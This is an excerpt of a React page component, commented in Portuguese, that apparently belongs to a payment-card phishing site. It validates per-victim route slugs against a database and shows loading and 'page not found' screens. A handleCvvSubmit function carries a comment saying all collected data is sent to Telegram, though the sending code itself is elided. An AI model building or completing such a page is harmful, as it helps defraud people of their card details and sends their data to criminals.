...
export default function RoutePage() {
  ...
  // Validar se a rota existe no banco
  useEffect(() => {
    async function validateRoute() {
      try {
        const response = await fetch(`/api/validate-route/${slug}`)
        const data = await response.json()
        setIsValidRoute(data.valid === true)
      } catch {
  ...
  const handleCvvSubmit = async () => {
    ...
    // Enviar todos os dados para o Telegram
  ...
  // Mostrar loading enquanto valida a rota
  if (isValidRoute === null) {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center">
        <div className="w-12 h-12 border-4 border-transparent border-t-[#0066cc] rounded-full animate-spin"></div>
      </div>
    )
  }
    ...
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center">
        <div className="bg-white p-8 rounded-lg shadow-md text-center">
          <h1 className="text-2xl font-semibold text-red-600 mb-2">Página não encontrada</h1>
          <p className="text-gray-600">A rota solicitada não existe ou está desativada.</p>
        </div>
      </div>
    )
  }
